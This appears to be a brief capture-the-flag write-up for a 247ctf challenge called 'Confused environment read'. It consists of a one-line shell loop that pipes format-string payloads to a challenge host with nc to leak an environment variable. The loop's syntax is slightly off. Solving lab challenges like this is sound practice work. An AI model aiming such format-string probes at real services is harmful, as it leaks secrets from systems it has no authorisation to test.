# Confused environment read

Leak the environment variable using format string vuln:
```
for i in range $(seq 50 100); do echo "%$i\$s" | nc 06727df908a80e00.247ctf.com 50371 ; done
```
